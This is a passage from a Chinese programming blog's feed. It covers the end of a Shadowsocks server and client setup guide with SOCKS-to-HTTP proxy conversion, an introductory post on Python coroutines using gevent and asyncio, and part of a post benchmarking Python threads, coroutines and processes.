<h5 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h5><p>将启动的命令加入到/etc/rc.local文件的最后<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi /etc/rc.local</div></pre></td></tr></table></figure></p>
<h5 id="设置非root用户运行ss"><a href="#设置非root用户运行ss" class="headerlink" title="设置非root用户运行ss"></a>设置非root用户运行ss</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo useradd ssuser //添加一个ssuser用户</div><div class="line">sudo ssserver [other options] --user ssuser //用ssuser这个用户来运行ss</div></pre></td></tr></table></figure>
<p>将之前的ssserver -c /etc/shadowsocks.json -d start改为ssserver -c /etc/shadowsocks.json -d start –user ssuser</p>
<h3 id="Install-shadowsocks-Client"><a href="#Install-shadowsocks-Client" class="headerlink" title="Install shadowsocks Client"></a>Install shadowsocks Client</h3><p>安装shadowsock客户端我也分为windows与Linux两种情况进行介绍。</p>
<h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><p>windows安装shadowsocks客户端比较简单，直接下载安装程序。<br>启动以后，填入服务端相应的配置（ip，port，密码，加密方式）<br>设置模式：<br><img src="/upload_image/20170222/1.png" alt=""><br><img src="/upload_image/20170222/2.png" alt=""><br>推荐使用PAC模式。</p>
<h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><p><em>此次主要花费的时间就在于linux上搭建shadowsocks客户端，坑不少（~主要是自己脑子有点晕~）</em></p>
<h5 id="Install-1"><a href="#Install-1" class="headerlink" title="Install"></a>Install</h5><p>安装同样简单：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install shadowsocks</div></pre></td></tr></table></figure></p>
<h5 id="配置condfig"><a href="#配置condfig" class="headerlink" title="配置condfig"></a>配置condfig</h5><p>配置也很简单，创建一个shadowsocks.json文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="string">"server"</span>:<span class="string">""</span>,</div><div class="line"><span class="string">"server_port"</span>:8000,</div><div class="line"><span class="string">"local_port"</span>:1080,</div><div class="line"><span class="string">"password"</span>:<span class="string">""</span>,</div><div class="line"><span class="string">"timeout"</span>:600,</div><div class="line"><span class="string">"method"</span>:<span class="string">"aes-256-cfb"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>内容类似上面，然后在命令行中运行：sslocal -c shadowsocks.json 此时系统会监听本地的1080端口。</p>
<h5 id="socks转http代理问题"><a href="#socks转http代理问题" class="headerlink" title="socks转http代理问题"></a>socks转http代理问题</h5><p>　　此时不是GUI窗口，只是一个命令行，怎么用curl等命令走http代理（网上资料大部分是设置浏览器，但不适合本文），原本可以用其他方案解决，但此时偏偏选择了shadowsocks，就只能一路走下去了。等一切都安装好，启动完以后，我发现http代理仍然用不了，然后就开始了心力憔悴的调试，搞了半天也还是用不了，最终同事发现了问题（socks代理需要转化为http代理，windows可以设置浏览器，linux需要下载工具转化）。<br>　　发现了原因所在，那么现在的问题是怎么讲socks代理转化为http代理？</p>
<h5 id="socks转http代理方案"><a href="#socks转http代理方案" class="headerlink" title="socks转http代理方案"></a>socks转http代理方案</h5><ul>
<li>proxychains 可以自动将socks代理转化为http代理。</li>
<li>polipo      用这个工具将socks代理转化为http代理。</li>
</ul>
<h5 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h5><p>安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/haad/proxychains</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure></p>
<p>配置：<br>修改配置文件proxychains.conf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">将socks4 127.0.0.1 9095改为socks5  127.0.0.1 1080  //1080改为你自己的端口</div></pre></td></tr></table></figure></p>
<p>使用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains curl http://thief.one</div></pre></td></tr></table></figure></p>
<p>详情参考：<a href="http://www.tuicool.com/articles/rUNFF3" target="_blank" rel="external">http://www.tuicool.com/articles/rUNFF3</a></p>
<h5 id="polipo"><a href="#polipo" class="headerlink" title="polipo"></a>polipo</h5><p>安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install polipo</div></pre></td></tr></table></figure></p>
<p>配置：<br>停止polipo服务 sudo service polipo stop<br>编辑polipo配置文件/etc/polipo/config，添加如下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">socksParentProxy = localhost:1080</div><div class="line">proxyPort = 1081</div></pre></td></tr></table></figure></p>
<p>启动polipo服务 sudo service polipo start</p>
<p>使用：</p>
<ul>
<li>app里面配置http_proxy=<a href="http://127.0.0.1:1081" target="_blank" rel="external">http://127.0.0.1:1081</a></li>
<li>bash里面可以编辑$HOME/.bashrc，添加export http_proxy=<a href="http://127.0.0.1:1081" target="_blank" rel="external">http://127.0.0.1:1081</a>　导出环境变量。当前bash要执行source $HOME/.bashrc来使配置文件生效。</li>
<li>git配置git config –global http.proxy 127.0.0.1:1081</li>
</ul>
<p>详情参考：<a href="http://blog.csdn.net/zcq8989/article/details/50545078" target="_blank" rel="external">http://blog.csdn.net/zcq8989/article/details/50545078</a></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shadowsocks </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python协程]]></title>
      <url>http://thief.one/2017/02/20/Python%E5%8D%8F%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center"><br>真正有知识的人的成长过程，就像麦穗的成长过程：麦穗空的时候，麦子长得很快，麦穗骄傲地高高昂起，但是，麦穗成熟饱满时，它们开始谦虚，垂下麦芒。<br>——蒙田《蒙田随笔全集》<br></blockquote><br>　　上篇论述了关于python多线程是否是鸡肋的问题，得到了一些网友的认可，当然也有一些不同意见，表示协程比多线程不知强多少，在协程面前多线程算是鸡肋。好吧，对此我也表示赞同，然而上篇我论述的观点不在于多线程与协程的比较，而是在于IO密集型程序中，多线程尚有用武之地。<br><a id="more"></a><br>　　对于协程，我表示其效率确非多线程能比，但本人对此了解并不深入，因此最近几日参考了一些资料，学习整理了一番，在此分享出来仅供大家参考，如有谬误请指正，多谢。</p>
<p>申明：<em>本文介绍的协程是入门级别，大神请绕道而行，谨防入坑。</em></p>
<p>文章思路：本文将先介绍协程的概念，然后分别介绍Python2.x与3.x下协程的用法，最终将协程与多线程做比较并介绍异步爬虫模块。</p>
<h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>　　协程，又称微线程，纤程，英文名Coroutine。协程的作用，是在执行函数A时，可以随时中断，去执行函数B，然后中断继续执行函数A（可以自由切换）。但这一过程并不是函数调用（没有调用语句），这一整个过程看似像多线程，然而协程只有一个线程执行。</p>
<h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul>
<li>执行效率极高，因为子程序切换（函数）不是线程切换，由程序自身控制，没有切换线程的开销。所以与多线程相比，线程的数量越多，协程性能的优势越明显。</li>
<li>不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在控制共享资源时也不需要加锁，因此执行效率高很多。</li>
</ul>
<p><em>　　说明：协程可以处理IO密集型程序的效率问题，但是处理CPU密集型不是它的长处，如要充分发挥CPU利用率可以结合多进程+协程。</em></p>
<p>　　以上只是协程的一些概念，可能听起来比较抽象，那么我结合代码讲一讲吧。这里主要介绍协程在Python的应用，Python2对协程的支持比较有限，生成器的yield实现了一部分但不完全，gevent模块倒是有比较好的实现；Python3.4以后引入了asyncio模块，可以很好的使用协程。</p>
<h3 id="Python2-x协程"><a href="#Python2-x协程" class="headerlink" title="Python2.x协程"></a>Python2.x协程</h3><p>python2.x协程应用：</p>
<ul>
<li>yield</li>
<li>gevent</li>
</ul>
<p>python2.x中支持协程的模块不多，gevent算是比较常用的，这里就简单介绍一下gevent的用法。</p>
<h4 id="Gevent"><a href="#Gevent" class="headerlink" title="Gevent"></a>Gevent</h4><p>　　gevent是第三方库，通过greenlet实现协程，其基本思想：<br>　　当一个greenlet遇到IO操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO。</p>
<h5 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h5><p>pip install gevent<br><em>最新版貌似支持windows了，之前测试好像windows上运行不了……</em></p>
<h5 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h5><p>首先来看一个简单的爬虫例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">import gevent</div><div class="line">from gevent import monkey;monkey.patch_all()</div><div class="line">import urllib2</div><div class="line"></div><div class="line">def get_body(i):</div><div class="line">	<span class="built_in">print</span> <span class="string">"start"</span>,i</div><div class="line">	urllib2.urlopen(<span class="string">"http://cn.bing.com"</span>)</div><div class="line">	<span class="built_in">print</span> <span class="string">"end"</span>,i</div><div class="line"></div><div class="line">tasks=[gevent.spawn(get_body,i) <span class="keyword">for</span> i <span class="keyword">in</span> range(3)]</div><div class="line">gevent.joinall(tasks)</div></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">start 0</div><div class="line">start 1</div><div class="line">start 2</div><div class="line">end 2</div><div class="line">end 0</div><div class="line">end 1</div></pre></td></tr></table></figure></p>
<p>　　说明：从结果上来看，执行get_body的顺序应该先是输出”start”，然后执行到urllib2时碰到IO堵塞，则会自动切换运行下一个程序（继续执行get_body输出start），直到urllib2返回结果，再执行end。也就是说，程序没有等待urllib2请求网站返回结果，而是直接先跳过了，等待执行完毕再回来获取返回值。值得一提的是，在此过程中，只有一个线程在执行，因此这与多线程的概念是不一样的。<br>换成多线程的代码看看:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line">import urllib2</div><div class="line"></div><div class="line">def get_body(i):</div><div class="line">	<span class="built_in">print</span> <span class="string">"start"</span>,i</div><div class="line">	urllib2.urlopen(<span class="string">"http://cn.bing.com"</span>)</div><div class="line">	<span class="built_in">print</span> <span class="string">"end"</span>,i</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(3):</div><div class="line">	t=threading.Thread(target=get_body,args=(i,))</div><div class="line">	t.start()</div></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">start 0</div><div class="line">start 1</div><div class="line">start 2</div><div class="line">end 1</div><div class="line">end 2</div><div class="line">end 0</div></pre></td></tr></table></figure></p>
<p>　　说明：从结果来看，多线程与协程的效果一样，都是达到了IO阻塞时切换的功能。不同的是，多线程切换的是线程（线程间切换），协程切换的是上下文（可以理解为执行的函数）。而切换线程的开销明显是要大于切换上下文的开销，因此当线程越多，协程的效率就越比多线程的高。（猜想多进程的切换开销应该是最大的）</p>
<h5 id="Gevent使用说明"><a href="#Gevent使用说明" class="headerlink" title="Gevent使用说明"></a>Gevent使用说明</h5><ul>
<li>monkey可以使一些阻塞的模块变得不阻塞，机制：遇到IO操作则自动切换，手动切换可以用gevent.sleep(0)（将爬虫代码换成这个，效果一样可以达到切换上下文）</li>
<li>gevent.spawn 启动协程，参数为函数名称，参数名称</li>
<li>gevent.joinall 停止协程</li>
</ul>
<h3 id="Python3-x协程"><a href="#Python3-x协程" class="headerlink" title="Python3.x协程"></a>Python3.x协程</h3><p>为了测试Python3.x下的协程应用，我在virtualenv下安装了python3.6的环境。<br>python3.x协程应用：</p>
<ul>
<li>asynico + yield from（python3.4）</li>
<li>asynico + await（python3.5）</li>
<li>gevent</li>
</ul>
<p>Python3.4以后引入了asyncio模块，可以很好的支持协程。</p>
<h4 id="asynico"><a href="#asynico" class="headerlink" title="asynico"></a>asynico</h4><p>　　asyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。asyncio的异步操作，需要在coroutine中通过yield from完成。</p>
<h5 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h5><p>例子：（需在python3.4以后版本使用）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import asyncio</div><div class="line"></div><div class="line">@asyncio.coroutine</div><div class="line">def <span class="built_in">test</span>(i):</div><div class="line">	<span class="built_in">print</span>(<span class="string">"test_1"</span>,i)</div><div class="line">	r=yield from asyncio.sleep(1)</div><div class="line">	<span class="built_in">print</span>(<span class="string">"test_2"</span>,i)</div><div class="line"></div><div class="line">loop=asyncio.get_event_loop()</div><div class="line">tasks=[<span class="built_in">test</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(5)]</div><div class="line">loop.run_until_complete(asyncio.wait(tasks))</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">test_1 3</div><div class="line">test_1 4</div><div class="line">test_1 0</div><div class="line">test_1 1</div><div class="line">test_1 2</div><div class="line">test_2 3</div><div class="line">test_2 0</div><div class="line">test_2 2</div><div class="line">test_2 4</div><div class="line">test_2 1</div></pre></td></tr></table></figure></p>
<p>　　说明：从运行结果可以看到，跟gevent达到的效果一样，也是在遇到IO操作时进行切换（所以先输出test_1，等test_1输出完再输出test_2）。但此处我有一点不明，test_1的输出为什么不是按照顺序执行的呢？可以对比gevent的输出结果（希望大神能解答一下）。</p>
<h5 id="asyncio说明"><a href="#asyncio说明" class="headerlink" title="asyncio说明"></a>asyncio说明</h5><p>　　@asyncio.coroutine把一个generator标记为coroutine类型，然后，我们就把这个coroutine扔到EventLoop中执行。<br>　　test()会首先打印出test_1，然后，yield from语法可以让我们方便地调用另一个generator。由于asyncio.sleep()也是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()返回时，线程就可以从yield from拿到返回值（此处是None），然后接着执行下一行语句。<br>　　把asyncio.sleep(1)看成是一个耗时1秒的IO操作，在此期间，主线程并未等待，而是去执行EventLoop中其他可以执行的coroutine了，因此可以实现并发执行。</p>
<h4 id="asynico-await"><a href="#asynico-await" class="headerlink" title="asynico/await"></a>asynico/await</h4><p>　　为了简化并更好地标识异步IO，从Python 3.5开始引入了新的语法async和await，可以让coroutine的代码更简洁易读。<br>　　请注意，async和await是针对coroutine的新语法，要使用新的语法，只需要做两步简单的替换：</p>
<ul>
<li>把@asyncio.coroutine替换为async；</li>
<li>把yield from替换为await。</li>
</ul>
<h5 id="Usage-2"><a href="#Usage-2" class="headerlink" title="Usage"></a>Usage</h5><p>例子（python3.5以后版本使用）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import asyncio</div><div class="line"></div><div class="line">async def <span class="built_in">test</span>(i):</div><div class="line">	<span class="built_in">print</span>(<span class="string">"test_1"</span>,i)</div><div class="line">	await asyncio.sleep(1)</div><div class="line">	<span class="built_in">print</span>(<span class="string">"test_2"</span>,i)</div><div class="line"></div><div class="line">loop=asyncio.get_event_loop()</div><div class="line">tasks=[<span class="built_in">test</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(5)]</div><div class="line">loop.run_until_complete(asyncio.wait(tasks))</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p>
<p>运行结果与之前一致。<br>说明：与前一节相比，这里只是把yield from换成了await，@asyncio.coroutine换成了async，其余不变。</p>
<h4 id="gevent"><a href="#gevent" class="headerlink" title="gevent"></a>gevent</h4><p>同python2.x用法一样。</p>
<h3 id="协程VS多线程"><a href="#协程VS多线程" class="headerlink" title="协程VS多线程"></a>协程VS多线程</h3><p>　　如果通过以上介绍，你已经明白多线程与协程的不同之处，那么我想测试也就没有必要了。因为当线程越来越多时，多线程主要的开销花费在线程切换上，而协程是在一个线程内切换的，因此开销小很多，这也许就是两者性能的根本差异之处吧。（个人观点）</p>
<h3 id="异步爬虫"><a href="#异步爬虫" class="headerlink" title="异步爬虫"></a>异步爬虫</h3><p>　　也许关心协程的朋友，大部分是用其写爬虫（因为协程能很好的解决IO阻塞问题），然而我发现常用的urllib、requests无法与asyncio结合使用，可能是因为爬虫模块本身是同步的（也可能是我没找到用法）。那么对于异步爬虫的需求，又该怎么使用协程呢？或者说怎么编写异步爬虫？<br>给出几个我所了解的方案：</p>
<ul>
<li>grequests （requests模块的异步化）</li>
<li>爬虫模块+gevent（比较推荐这个）</li>
<li>aiohttp （这个貌似资料不多，目前我也不太会用）</li>
<li>asyncio内置爬虫功能 （这个也比较难用）</li>
</ul>
<p><em>本文没有太多的干货，都是一些自学时的笔记，分享给新手朋友，仅供参考</em></p>
<p>文章学习通道：</p>
<ul>
<li><a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python多进程</a></li>
<li><a href="http://thief.one/2017/02/17/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%B8%A1%E5%B9%B4%E4%B8%8D%E9%B8%A1%E8%82%8B/">Python多线程</a></li>
</ul>
<p><hr><br>本文内容参考来源：<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432090954004980bd351f2cd4cc18c9e6c06d855c498000" target="_blank" rel="external">廖雪峰python教程</a>，推荐新手学习。<br>本文地址：<a href="http://thief.one/2017/02/20/Python协程/">Python协程</a>，转载请注明出处。</p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python协程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python多线程鸡年不鸡肋]]></title>
      <url>http://thief.one/2017/02/17/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%B8%A1%E5%B9%B4%E4%B8%8D%E9%B8%A1%E8%82%8B/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">术业有专攻，如是而已</blockquote><br>当初在刚学习python多线程时，上网搜索资料几乎都是一片倒的反应python没有真正意义上的多线程，python多线程就是鸡肋。当时不明所以，只是了解到python带有GIL解释器锁的概念，同一时刻只能有一个线程在运行，遇到IO操作才会释放切换。那么，python多线程是否真的很鸡肋呢？要解决这个疑惑，我想必须亲自动手测试。<br><a id="more"></a><br>　　经过对比python与java的多线程测试，我发现python多线程的效率确实不如java，但远还没有达到鸡肋的程度，那么跟其他机制相比较呢？</p>
<h3 id="观点：用多进程替代多线程需求"><a href="#观点：用多进程替代多线程需求" class="headerlink" title="观点：用多进程替代多线程需求"></a>观点：用多进程替代多线程需求</h3><p>　　辗转了多篇博文，我看到了一些网友的观点，觉得应该使用python多进程来代替多线程的需求，因为多进程不受GIL的限制。于是我便动手使用多进程去解决一些并发问题，期间也遇到了一些坑，所幸大部分查找资料解决了，然后对多进程做了简单汇总介绍<a href="http://thief.one/2016/11/23/Python-multiprocessing/">Python多进程</a>。<br>　　那么是否多进程能完全替代多线程呢？别急，我们继续往下看。</p>
<h3 id="观点：协程为最佳方案"><a href="#观点：协程为最佳方案" class="headerlink" title="观点：协程为最佳方案"></a>观点：协程为最佳方案</h3><p>　　协程的概念目前来说是比较火热的，协程不同于线程的地方在于协程不是操作系统进行切换，而是由程序员编码进行切换的，也就是说切换是由程序员控制的，这样就没有了线程所谓的安全问题。协程的概念非常广而深，本文暂不做具体介绍，以后会单独成文。</p>
<h3 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h3><p>　　好了，网上的观点无非是使用多进程或者协程来代替多线程（当然换编程语言，换解释器之类方法除外），那么我们就来测试下这三者的性能之差。既然要公平测试，就应该考虑IO密集型与CPU密集型的问题，所以分两组数据进行测试。</p>
<h4 id="IO密集型测试"><a href="#IO密集型测试" class="headerlink" title="IO密集型测试"></a>IO密集型测试</h4><p>　　测试IO密集型，我选择最常用的爬虫功能，计算爬虫访问bing所需要的时间。（主要测试多线程与协程，单线程与多进程就不测了，因为没有必要）<br>测试代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">from gevent import monkey;monkey.patch_all()</div><div class="line">import gevent</div><div class="line">import time</div><div class="line">import threading</div><div class="line">import urllib2</div><div class="line"></div><div class="line">def urllib2_(url):</div><div class="line">	try:</div><div class="line">		urllib2.urlopen(url,timeout=10).read()</div><div class="line">	except Exception,e:</div><div class="line">		<span class="built_in">print</span> e</div><div class="line"></div><div class="line">def gevent_(urls):</div><div class="line">	<span class="built_in">jobs</span>=[gevent.spawn(urllib2_,url) <span class="keyword">for</span> url <span class="keyword">in</span> urls]</div><div class="line">	gevent.joinall(<span class="built_in">jobs</span>,timeout=10)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">jobs</span>:</div><div class="line">		i.join()</div><div class="line"></div><div class="line">def thread_(urls):</div><div class="line">	a=[]</div><div class="line">	<span class="keyword">for</span> url <span class="keyword">in</span> urls:</div><div class="line">		t=threading.Thread(target=urllib2_,args=(url,))</div><div class="line">		a.append(t)</div><div class="line"></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">		i.start()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">		i.join()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	urls=[<span class="string">"https://www.bing.com/"</span>]*10      </div><div class="line">	t1=time.time()</div><div class="line">	gevent_(urls)</div><div class="line">	t2=time.time()</div><div class="line">	<span class="built_in">print</span> <span class="string">'gevent-time:%s'</span> % str(t2-t1)</div><div class="line">	thread_(urls)</div><div class="line">	t4=time.time()</div><div class="line">	<span class="built_in">print</span> <span class="string">'thread-time:%s'</span> % str(t4-t2)</div></pre></td></tr></table></figure></p>
<p>测试结果：<br>访问10次<br>gevent-time:0.380326032639<br>thread-time:0.376606941223<br>访问50次<br>gevent-time:1.3358900547<br>thread-time:1.59564089775<br>访问100次<br>gevent-time:2.42984986305<br>thread-time:2.5669670105<br>访问300次<br>gevent-time:6.66330099106<br>thread-time:10.7605059147<br>从结果可以看出，当并发数不断增大时，协程的效率确实比多线程要高，但在并发数不是那么高时，两者差异不大。</p>
<h4 id="CPU密集型"><a href="#CPU密集型" class="headerlink" title="CPU密集型"></a>CPU密集型</h4><p>CPU密集型，我选择科学计算的一些功能，计算所需时间。（主要测试单线程、多线程、协程、多进程）<br>测试代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">from multiprocessing import Process as pro</div><div class="line">from multiprocessing.dummy import Process as thr</div><div class="line">from gevent import monkey;monkey.patch_all()</div><div class="line">import gevent</div><div class="line"></div><div class="line">def run(i):</div><div class="line">	lists=range(i)</div><div class="line">	list(<span class="built_in">set</span>(lists))</div><div class="line">	</div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	多进程</div><div class="line">	'<span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(30):      <span class="comment">##10-2.1s 20-3.8s 30-5.9s</span></div><div class="line">		t=pro(target=run,args=(5000000,))</div><div class="line">		t.start()</div><div class="line"></div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	多线程</div><div class="line">	'<span class="string">''</span></div><div class="line">	<span class="comment"># for i in range(30):    ##10-3.8s  20-7.6s  30-11.4s</span></div><div class="line">	<span class="comment"># 	t=thr(target=run,args=(5000000,))</span></div><div class="line">	<span class="comment"># 	t.start()</span></div><div class="line"></div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	协程</div><div class="line">	'<span class="string">''</span></div><div class="line">	<span class="comment"># jobs=[gevent.spawn(run,5000000) for i in range(30)]  ##10-4.0s 20-7.7s 30-11.5s</span></div><div class="line">	<span class="comment"># gevent.joinall(jobs)</span></div><div class="line">	<span class="comment"># for i in jobs:</span></div><div class="line">	<span class="comment"># 	i.join()</span></div><div class="line"></div><div class="line">	<span class="string">''</span><span class="string">'</span></div><div class="line">	单线程</div><div class="line">	'<span class="string">''</span></div><div class="line">	<span class="comment"># for i in range(30):  ##10-3.5s  20-7.6s 30-11.3s</span></div><div class="line">	<span class="comment"># 	run(5000000)</span></div></pre></td></tr></table></figure></p>
<p>测试结果：</p>
<ul>
<li>并发10次：【多进程】2.1s   【多线程】3.8s   【协程】4.0s  【单线程】3.5s</li>
<li>并发20次：【多进程】3.8s   【多线程】7.6s   【协程】7.7s  【单线程】7.6s</li>
<li>并发30次：【多进程】5.9s   【多线程】11.4s  【协程】11.5s 【单线程】11.3s </li>
</ul>
<p>　　可以看到，在CPU密集型的测试下，多进程效果明显比其他的好，多线程、协程与单线程效果差不多。这是因为只有多进程完全使用了CPU的计算能力。在代码运行时，我们也能够看到，只有多进程可以将CPU使用率占满。</p>
<h3 id="本文结论"><a href="#本文结论" class="headerlink" title="本文结论"></a>本文结论</h3><p>　　从两组数据我们不难发现，python多线程并没有那么鸡肋。如若不然，Python3为何不去除GIL呢？对于此问题，Python社区也有两派意见，这里不再论述，我们应该尊重Python之父的决定。<br>　　至于何时该用多线程，何时用多进程，何时用协程？想必答案已经很明显了。<br>　　当我们需要编写并发爬虫等IO密集型的程序时，应该选用多线程或者协程（亲测差距不是特别明显）；当我们需要科学计算，设计CPU密集型程序，应该选用多进程。当然以上结论的前提是，不做分布式，只在一台服务器上测试。<br>　　答案已经给出，本文是否就此收尾？既然已经论述Python多线程尚有用武之地，那么就来介绍介绍其用法吧。</p>
